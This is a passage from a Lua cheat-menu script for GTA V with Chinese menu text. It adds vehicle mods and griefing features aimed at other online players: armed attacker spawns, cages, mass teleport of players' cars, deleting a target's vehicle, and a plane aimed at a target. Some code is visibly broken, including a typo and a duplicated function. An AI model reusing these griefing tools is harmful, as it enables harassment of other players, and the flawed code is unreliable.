        local clown = entities.create_ped(1, clown_hash, spawn_pos, 0.0)
        PED.SET_PED_INTO_VEHICLE(clown, van, i)
        if i % 2 == 0 then
            WEAPON.GIVE_WEAPON_TO_PED(clown, -1810795771, 1000, false, true)
        else
            WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201, 1000, false, true)
        end
        PED.SET_PED_COMBAT_ATTRIBUTES(clown, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(clown, 46, true)
        if i == -1 then
            TASK.TASK_VEHICLE_CHASE(clown, player_ped)
        else
            TASK.TASK_COMBAT_PED(clown, player_ped, 0, 16)
        end
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(clown, true)
        end
    end
end
local function SF_ff9()
    local scaleform = require('lib.GTlib.Z')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(0, 86, true), '爆炸 或 推开按')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
local charger = {charg = util.joaat('dukes2'), emp = util.joaat('hei_prop_heist_emp')}
local function Ccreate(pCoor, pedSi)
    if ENTITY.DOES_ENTITY_EXIST(charger.charg) ==false then
        FFchar = VEHICLE.CREATE_VEHICLE(charger.charg, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
        PED.SET_PED_INTO_VEHICLE(pedSi, FFchar, -1)
        VEHICLE.SET_VEHICLE_COLOURS(FFchar, 118, 0)
        for M=0, 49 do
            local modn = VEHICLE.GET_NUM_VEHICLE_MODS(FFchar, M)
            VEHICLE.SET_VEHICLE_MOD(FFchar, M, modn -1, false)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(FFchar, 'MOPAR')
            VEHICLE.GET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 14, 0)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 22, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 18, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 20, true)
            VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(FFchar, 0, 0, 0)
            VEHICLE.SET_VEHICLE_WHEEL_TYPE(FFchar, 7)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 23, 26)
            VEHICLE._SET_VEHICLE_MAX_SPEED(FFchar, 100)
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(FFchar, 40)
            VEHICLE.SET_VEHICLE_BURNOUT(FFchar, false)
        end
        wait(150)
       local ccoor = ENTITY.GET_ENTITY_COORDS(FFchar)
        if  ENTITY.DOES_ENTITY_EXIST(charger.emp) ==false
        then Empa = OBJECT.CREATE_OBJECT(charger.emp, ccoor.x, ccoor.y -1, ccoor.z -1, true, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(Empa, FFchar, 0, 0.0, -2.0, 0.5, 0.0, 0.0, 0.0, false, true, false, false, 0, true)
            local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
            ENTITY.SET_ENTITY_HEADING(FFchar, CV)
            wait()
        end
    local magtf = {true, false}
    local maglist = {'推开', '爆炸'}
    local magval = {mag_v = true}
    function Magout()
        if  PAD.IS_CONTROL_PRESSED(0, 86) then
        local car = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        FIRE.ADD_EXPLOSION(car.x, car.y, car.z, 81, 5000.0, false, true, 0.0, magval.mag_v)
        end
    wait()
end
    Mag_int = menu.list_action(ff9car, '电磁脉冲样式', {'Magint'}, '更改电磁脉冲样式为推开或炸毁', maglist, function(magint)
        magval.mag_v = magtf[magint]
        end)
      util.create_tick_handler(function ()
            if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, false) ==true then
            VEHICLE.SET_VEHICLE_DIRT_LEVEL(FFchar, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(FFchar, true)
            VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(FFchar, false)
            SF_ff9()
            end
        end)
        else
    end
end
function spawnspecialcar()
    Streament(charger.charg)
    Streament(charger.emp)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pCoor = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local pH = ENTITY.GET_ENTITY_HEADING(pCoor)
        if players.is_in_interior(players.user()) ==true then
            if set.alert then
                gtoast('不要在室内生成道奇战马')
            end
            menu.set_value(Spawn, false)
            return
        end
    if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==false and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        entities.delete_by_handle(curcar)
        if set.alert then
            gtoast('去他妈的上一辆车,已为您更换新的')
        end
        Ccreate(pCoor, pedSi)
        elseif PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==true then
            Magout()
        elseif PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==false then
                Ccreate(pCoor, pedSi)
                 if set.alert then
                    gtoast('道奇战马已生成')
                 end
        end
if PED.IS_PED_GETTING_INTO_A_VEHICLE(players.user_ped()) ==false and PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar , false) ==false
            then
                if set.alert then
                    gtoast('玩家已离开道奇战马并已被删除')
                end
        ---@diagnostic disable-next-line: param-type-mismatch
              menu.set_value(Spawn, false)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(FFchar)
              entities.delete_by_handle(FFchar)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Empa)
              entities.delete_by_handle(Empa)
              menu.delete(Mag_int)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.charg)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.emp)
              util.stop_thread()
            end
        end
function SFlsd()
    local scaleform = require('GTlib.Z')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
---@diagnostic disable-next-line: param-type-mismatch
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), '镭射')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end
function Vmod(vmod, plate)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    for M=0, 49 do
        local modn =  VEHICLE.GET_NUM_VEHICLE_MODS(vmod, M)
        VEHICLE.SET_VEHICLE_MOD(vmod, M, modn -1, false)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vmod, plate)
        VEHICLE.GET_VEHICLE_MOD_KIT(vmod, 0)
        VEHICLE.SET_VEHICLE_MOD_KIT(vmod, 0)
        VEHICLE.SET_VEHICLE_MOD(vmod, 14, 0)
        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 18, true)
        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 20, true)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vmod, 0, 0, 0)
        VEHICLE.SET_VEHICLE_MAX_SPEED(vmod, 100)
        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vmod, 40)
        VEHICLE.SET_VEHICLE_BURNOUT(vmod, false)
    end
end
local function SDcreate(pCoor, pedSi)
    Lsdcar = VEHICLE.CREATE_VEHICLE(lsd.hash, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
    PED.SET_PED_INTO_VEHICLE(pedSi, Lsdcar, -1)
    Vmod(Lsdcar, '镭射')
   local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
   ENTITY.SET_ENTITY_HEADING(Lsdcar, CV)
Lsd_w = menu.list_select(sdroot, '魔幻战马武器', {'lsdweap'},'更改魔幻激光战马的武器', lsdweap, 1, function(vweap)
    lsd.weap = lsdh[vweap]
end)
util.create_tick_handler(function ()
        if PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar, false) ==true then
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(Lsdcar, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(Lsdcar, true)
        VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(Lsdcar, false)
        SFlsd()
        end
    end)
end
local shoot_from_vehicle_Lazer_Space_Car = function (vehicle, damage, weaponHash, ownerPed, isAudible, isVisible, speed, target, position)
    local min, max = v3.new(), v3.new()
    local offset
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
    if position == 0 then
        offset = v3.new(min.x + 0.3, max.y + 0.25, 0.5)
    elseif position == 1 then
        offset = v3.new(min.x + 0.3, min.y + 4, 0.5)
    elseif position == 2 then
        offset = v3.new(max.x - 0.3, max.y + 0.25, 0.5)
    elseif position == 3 then
        offset = v3.new(max.x - 0.3, min.y + 4, 0.5)
    else
        error("got unexpected position")offset = v3.new(min.x + 0.25, max.y, 0.5)
    end
    local a = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, offset.x, offset.y - 3.15, offset.z + 1.05)
    local direction = ENTITY.GET_ENTITY_ROTATION(vehicle, 2):toDir()
    if get_vehicle_cam_relative_heading(vehicle) > 95.0 then
        direction:mul(-1)
    end
    local b = v3.new(direction)
    b:mul(300.0); b:add(a)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(
        a.x, a.y, a.z,
        b.x, b.y, b.z - 15,
        damage,
        true,
        weaponHash,
        ownerPed,
        isAudible,
        not isVisible,
        speed,
        vehicle,
        false, false, target, false, 0, 0, 0
    )
end
function spawnspecialcar()
    Streament(charger.charg)
    Streament(charger.emp)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pCoor = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local pH = ENTITY.GET_ENTITY_HEADING(pCoor)
        if players.is_in_interior(players.user()) ==true then
            if set.alert then
                gtoast('不要在室内生成道奇战马')
            end
            menu.set_value(Spawn, false)
            return
        end
    if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==false and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        entities.delete_by_handle(curcar)
        if set.alert then
            gtoast('去他妈的上一辆车,已为您更换新的')
        end
        Ccreate(pCoor, pedSi)
        elseif PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==true then
            Magout()
        elseif PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==false then
                Ccreate(pCoor, pedSi)
                 if set.alert then
                    gtoast('道奇战马已生成')
                 end
        end
if PED.IS_PED_GETTING_INTO_A_VEHICLE(players.user_ped()) ==false and PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar , false) ==false
            then
            if set.alert then
            gtoast('玩家已离开道奇战马并已被删除')
            end
            menu.set_value(Spawn, false)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(FFchar)
            entities.delete_by_handle(FFchar)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Empa)
            entities.delete_by_handle(Empa)
            menu.delete(Mag_int)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.charg)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.emp)
            util.stop_thread()
            end
            end
function Lazer_Space_Car()
    Streament(lsd.hash)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pCoor = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local pH = ENTITY.GET_ENTITY_HEADING(pCoor)
        if players.is_in_interior(players.user()) ==true then
            if set.alert then
                gtoast('魔幻激光战马不会在内部生成')
            end
            menu.set_value(SDspawn, false)
            return
        end
    if PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar, true) ==false and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        entities.delete_by_handle(curcar)
        if set.alert then
            gtoast('已为您更换新的战马')
        end
        for i = 1, 1 do
            SDcreate(pCoor, pedSi)
        end
        elseif PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar, true) ==true then
            local weap = util.joaat(lsd.weap)
            WEAPON.REQUEST_WEAPON_ASSET(weap)
            if not ENTITY.DOES_ENTITY_EXIST(Lsdcar) or not PAD.IS_CONTROL_PRESSED(0, 86)
            then
                return
            elseif get_vehicle_cam_relative_heading(Lsdcar) < 95.0 then
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 0)
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 2)
            else
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 1)
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 3)
            end
        elseif PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==false and not ENTITY.DOES_ENTITY_EXIST(Lsdcar) then
            SDcreate(pCoor, pedSi)
                 if set.alert then
                    gtoast('生成了魔幻激光战马')
                 end
        end
if PED.IS_PED_GETTING_INTO_A_VEHICLE(players.user_ped()) ==false and PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar , false) ==false
            then
                if set.alert then
                    gtoast('玩家已离开魔幻激光战马，它已被删除')
                end
              menu.set_value(SDspawn, false)
              STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(lsd.hash)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Lsdcar)
              entities.delete_by_handle(Lsdcar)
              menu.delete(Lsd_w)
              util.stop_thread()
            end
        end
function forcecmsoncar()
    if PAD.IS_CONTROL_PRESSED(46, 46) then
        local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), math.random(-5, 5), -30.0, math.random(-5, 5))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z'], 100.0, true, 1198879012, players.user_ped(), true, false, 100.0)
    end
end
tesla_ped = 0
function teslasummoncar()
    lastcar = PLAYER.GET_PLAYERS_LAST_VEHICLE()
    if lastcar ~= 0 then
        local plyr = PLAYER.PLAYER_PED_ID()
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 5.0, 0.0)
        local phash = -67533719
        request_model_load(phash)
        tesla_ped = entities.create_ped(32, phash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
        tesla_blip = HUD.ADD_BLIP_FOR_ENTITY(tesla_ped)
        HUD.SET_BLIP_COLOUR(tesla_blip, 7)
        ENTITY.SET_ENTITY_VISIBLE(tesla_ped, false, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ped, true)
        PED.SET_PED_FLEE_ATTRIBUTES(tesla_ped, 0, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(lastcar, true)
        PED.SET_PED_INTO_VEHICLE(tesla_ped, lastcar, -1)
        TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ped, lastcar, coords['x'], coords['y'], coords['z'], 300.0, 786996, 5)
    end
end
player_cur_car = 0
function carlshormspam()
    if player_cur_car ~= 0 and  PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        VEHICLE.SET_VEHICLE_MOD(player_cur_car, 14, math.random(0, 51), false)
        PAD._SET_CONTROL_NORMAL(2, 86, 1.0)
        wait(50)
        PAD._SET_CONTROL_NORMAL(2, 86, 0.0)
    end
end
function tm02fastshot()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        gtoast("请先驾驶TM-02 可汗贾利.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end
function setcardirty(s)
    if player_cur_car ~= 0 then
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(player_cur_car, s)
    end
end
function setstacky(s)
    if player_cur_car ~= 0 then
        old_veh = player_cur_car
        for i=1, s do
            local c = ENTITY.GET_ENTITY_COORDS(old_veh, false)
            local mdl = ENTITY.GET_ENTITY_MODEL(player_cur_car)
            local size = get_model_size(mdl)
            local r = ENTITY.GET_ENTITY_ROTATION(old_veh, 0)
            new_veh = entities.create_vehicle(mdl, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(old_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(new_veh, old_veh, 0, 0.0, 0.0, size.z, 0.0, 0.0, 0.0, true, false, falsmy_e, false, 0, true)
            old_veh = new_veh
        end
    end
end
function setstackx(s)
    if player_cur_car ~= 0 then
        for i=1, s do
            main_veh = player_cur_car
            local c = ENTITY.GET_ENTITY_COORDS(main_veh, false)
            local mdl = ENTITY.GET_ENTITY_MODEL(main_veh)
            local size = get_model_size(mdl)
            local r = ENTITY.GET_ENTITY_ROTATION(main_veh, 0)
            left_new = entities.create_vehicle(mdl, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(main_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(left_new, main_veh, 0, -size.x*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true)
            right_new = entities.create_vehicle(mdl, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(main_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(right_new, main_veh, 0, size.x*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true)
        end
    end
end
function forceteleplace()
    menu.action(apforcedacts_root, "传送载具到航路点", {"tpavtoway"}, "这可能有效，也可能无效。如果这不起作用，它不是一个bug", function(on_click)
        local c = get_waypoint_coords()
        if c ~= nil then
            tp_all_player_cars_to_coords(c)
        end
    end)
    menu.action(apforcedacts_root, "传送载具到花园银行直升机停机坪", {"tpavtomaze"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = -75.261375
        c.y = -818.674
        c.z = 326.17517
        tp_all_player_cars_to_coords(c)
    end)
    menu.action(apforcedacts_root, "传送载具到深海底", {"tpavunderwater"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = 4497.2207
        c.y = 8028.3086
        c.z = -32.635174
        tp_all_player_cars_to_coords(c)
    end)
    menu.action(apforcedacts_root, "传送载具到高空", {"tpahigh"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = -75
        c.y = -818
        c.z = 2400
        tp_all_player_cars_to_coords(c)
    end)
    menu.action(apforcedacts_root, "传送载具到洛圣都改车王", {"tpavlsc"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = -353.84512
        c.y = -135.59108
        c.z = 39.009624
        tp_all_player_cars_to_coords(c)
    end)
    menu.action(apforcedacts_root, "传送载具到监狱SCP-173单元", {"tpavscp"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = 1642.8401
        c.y = 2570.7695
        c.z = 45.564854
        tp_all_player_cars_to_coords( c)
    end)
    menu.action(apforcedacts_root, "传送载具到大牢房中", {"tpavcell"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = 1737.1896
        c.y = 2634.897
        c.z = 45.56497
        tp_all_player_cars_to_coords(c)
    end)
end
--广告机拦截
file_name = filesystem.scripts_dir() .. '\\GTLuaScript\\'..'AnTi_Adword.txt'
banned_words = {}
function file_exists(path)
    local file = io.open(path, "rb")
    if file then file:close() end
    return file ~= nil
end
if not file_exists(file_name) then
  gtoast(file_name .. ' was not found, please make sure the script is installed correctly.')
  util.stop_script()
else
    file = io.open(file_name, "r")
    i = 0
    for l in file:lines() do
        i = i + 1
        banned_words[i] = string.lower(l)
    end
    file:close()
end
function Streament(hash)
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    wait()
    end
end
function Delcar(vic, spec, pid)
    if PED.IS_PED_IN_ANY_VEHICLE(vic) ==true then
        local tarcar = PED.GET_VEHICLE_PED_IS_IN(vic, true)
        GetControl(tarcar, spec, pid)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(tarcar)
        entities.delete_by_handle(tarcar)
    end
end
function SetPedCoor(pedS, tarx, tary, tarz)
    ENTITY.SET_ENTITY_COORDS(pedS, tarx, tary, tarz, false, true, true, false)
end
function Teabagtime(p1, p2, p3, p4, p5, p6, p7, p8)
    util.create_tick_handler (function ()
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p1, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p2, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p3, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p4, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p5, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p6, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p7, 'LES1A_DHAC', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(p8, 'TUSCO_AHAD', 'LESTER', 'SPEECH_PARAMS_FORCE_SHOUTED', 1)
        wait(100)
        end)
end
function Jesuslovesyou(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(pi, 'BUMP', 'JESSE', 'SPEECH_PARAMS_FORCE', 1)
            wait(250)
        end
    end)
end
function Trevortime(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(pi, 'TR2_ABAJ', 'TREVOR', 'SPEECH_PARAMS_FORCE', 1)
            wait(100)
        end
    end)
end
function Fuckyou(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'GENERIC_FUCK_YOU', 'SPEECH_PARAMS_FORCE', 1)
            wait(100)
        end
    end)
end
function Provoke(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'Provoke_Trespass', 'Speech_Params_Force_Shouted_Critical', 1)
            wait(100)
        end
    end)
end
function JuggleCar(Vehj_h, tar1,  invisjugc, jugr)
    local  CC = VEHICLE.CREATE_VEHICLE(Vehj_h, tar1.x, tar1.y, tar1.z - 5.0, 0, true, true, false)
    if invisjugc then
     ENTITY.SET_ENTITY_VISIBLE(CC, false, 0)
 end
     ENTITY.SET_ENTITY_INVINCIBLE(CC, true)
     ENTITY.SET_ENTITY_VELOCITY(CC, 0, 0, 1000)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(CC, true)
     VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(CC, true)
     wait(jugr)
     ENTITY.SET_ENTITY_AS_MISSION_ENTITY(CC)
     entities.delete_by_handle(CC)
end
function Insulthigh(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'Generic_Insult_High', 'SPEECH_PARAMS_FORCE', 1)
            wait(100)
        end
    end)
end
function Warcry(ped_tab)
    util.create_tick_handler (function ()
        for _, pi in ipairs(ped_tab) do
            AUDIO.PLAY_PED_AMBIENT_SPEECH_NATIVE(pi, 'GENERIC_WAR_CRY', 'SPEECH_PARAMS_FORCE', 1)
            wait(100)
        end
    end)
end
function Streamanim(anim) --Streaming Model
    STREAMING.REQUEST_ANIM_DICT(anim)
    while STREAMING.HAS_ANIM_DICT_LOADED(anim) ==false do
        STREAMING.REQUEST_ANIM_DICT(anim)
        wait()
    end
end
function Runanim(ent, animdict, anim)
    TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
    while ENTITY.IS_ENTITY_PLAYING_ANIM(ent, animdict, anim, 3) ==false do
        TASK.TASK_PLAY_ANIM(ent, animdict, anim, 1.0, 1.0, -1, 3, 0.5, false, false, false)
        wait()
    end
end
function Streamptfx(lib)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(lib)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(lib) do
        wait()
    end
    GRAPHICS.USE_PARTICLE_FX_ASSET(lib)
end
function PFP(pedm, playerm)--Ped Facing Player adapted from PhoenixScript
    local ppos = ENTITY.GET_ENTITY_COORDS(playerm)
    local pmpos = ENTITY.GET_ENTITY_COORDS(pedm)
    local hx = ppos.x - pmpos.x
    local hy = ppos.y - pmpos.y
    local head = MISC.GET_HEADING_FROM_VECTOR_2D(hx, hy)
    return ENTITY.SET_ENTITY_HEADING(pedm, head)
end
function DelEnt(ped_tab)
    for _, Pedm in ipairs(ped_tab) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Pedm)
        entities.delete_by_handle(Pedm)
    end
end
function Stopsound()
    for i = 0, 99 do
        AUDIO.STOP_SOUND(i)
    end
end
function StandUser(pid)
    if players.exists(pid) and pid ~= players.user() then
        for _, cmd in ipairs(menu.player_root(pid):getChildren()) do
            if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING and (cmd:refByRelPath("Stand User"):isValid() or cmd:refByRelPath("Stand User (Co-Loading"):isValid()) then
                return true
            end
        end
    end
    return false
end
function IPM(targets, tar1, pname, cage_table, pid)
    local tar2 = ENTITY.GET_ENTITY_COORDS(targets)
    local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, tar1.x, tar1.y, tar1.z)
    if disbet <= 0.5  then
    if set.alert then
        gtoast(pname..' 已被笼子困住')
    end
    wait(800)
    elseif disbet >= 0.5  then
    wait(800)
    if set.alert then
        gtoast(pname..' 挣脱了笼子')
    end
    DelEnt(cage_table[pid])
    cage_table[pid] = false
    Stopsound()
    end
end
function CombineTables(table1, table2, table3, table4, table5, table6, table7, table8, table9, table10, table11, result)
	for _, v in ipairs(table1) do
		table.insert(result, v)
	end
	for _, v in ipairs(table2) do
		table.insert(result, v)
	end
    for _, v in ipairs(table3) do
		table.insert(result, v)
	end
	for _, v in ipairs(table4) do
		table.insert(result, v)
	end
    for _, v in ipairs(table5) do
		table.insert(result, v)
	end
	for _, v in ipairs(table6) do
		table.insert(result, v)
	end
    for _, v in ipairs(table7) do
		table.insert(result, v)
	end
	for _, v in ipairs(table8) do
		table.insert(result, v)
	end
    for _, v in ipairs(table9) do
		table.insert(result, v)
	end
	for _, v in ipairs(table10) do
		table.insert(result, v)
	end
    for _, v in ipairs(table11) do
		table.insert(result, v)
	end
end
function ObjFrezSpawn(hsel, tar1)
    local objHash = hsel
  local objfS =  OBJECT.CREATE_OBJECT(objHash, tar1.x, tar1.y, tar1.z, true, true, true)
  ENTITY.FREEZE_ENTITY_POSITION(objfS, true)
  return objfS
end
function SetObjCo(objS, tarx, tary, tarz)
    SEC(objS, tarx, tary, tarz, false, true, true, false)
end
function planedied(pid, index, plane)
    local hash <const> = util.joaat(plane)
    request_model(hash)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = get_random_offset_from_entity(targetPed, 20.0, 20.0)
    pos.z = pos.z + 30.0
    local plane = entities.create_vehicle(hash, pos, 0.0)
    set_entity_face_entity(plane, targetPed, true)
